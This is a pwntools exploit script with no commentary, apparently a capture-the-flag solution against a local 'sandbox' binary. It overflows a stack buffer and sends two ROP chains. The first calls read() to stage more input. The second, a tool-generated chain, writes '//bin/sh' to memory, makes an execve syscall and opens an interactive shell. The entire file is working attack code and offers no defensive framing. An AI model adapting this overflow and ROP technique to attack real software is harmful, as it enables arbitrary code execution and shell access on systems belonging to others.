from pwn import *

context.arch = "amd64"
context.terminal = "tmux splitw -h".split()
pop_rdi = 0x401004
pop_rsi = 0x401006
pop_rdx = 0x401008
pop_rax = 0x40100a
syscall = 0x00401016
exe = 0x0040107f

r = remote("localhost", 1337)
# r = process(["./sandbox", "./user"])
payload = b"\x90" * 0x28
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi)
payload += p64(0x7fffffeff500)
payload += p64(pop_rdx)
payload += p64(0x600)
payload += p64(syscall)
r.sendline(payload)

from struct import pack

p = lambda x : p64(x)

IMAGE_BASE_0 = 0x0000000000400000 # 2bcc2ca53665a9c858e7a1be83c198a6cc41a80b2388993a693fa7a595c8488c
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = b''

rop += rebase_0(0x00000000000022e9) # 0x00000000004022e9: pop r13; ret;
rop += b'//bin/sh'
rop += rebase_0(0x00000000000019ea) # 0x00000000004019ea: pop rbx; ret;
rop += rebase_0(0x000000000023c160)
rop += rebase_0(0x00000000001797e5) # 0x00000000005797e5: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret;
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x00000000000022e9) # 0x00000000004022e9: pop r13; ret;
rop += p(0x0000000000000000)
rop += rebase_0(0x00000000000019ea) # 0x00000000004019ea: pop rbx; ret;
rop += rebase_0(0x000000000023c168)
rop += rebase_0(0x00000000001797e5) # 0x00000000005797e5: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret;
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x0000000000001ada) # 0x0000000000401ada: pop rdi; ret;
rop += rebase_0(0x000000000023c160)
rop += rebase_0(0x00000000000020a8) # 0x00000000004020a8: pop rsi; ret;
rop += rebase_0(0x000000000023c168)
rop += rebase_0(0x00000000000019bf) # 0x00000000004019bf: pop rdx; ret;
rop += rebase_0(0x000000000023c168)
rop += rebase_0(0x00000000000c1570) # 0x00000000004c1570: pop rax; ret;
rop += p(0x000000000000003b)
rop += rebase_0(0x00000000000c0925) # 0x00000000004c0925: syscall; ret;


import time
time.sleep(0.5)
payload = b"a" * (1064)
payload += rop
r.sendline(payload)

r.interactive()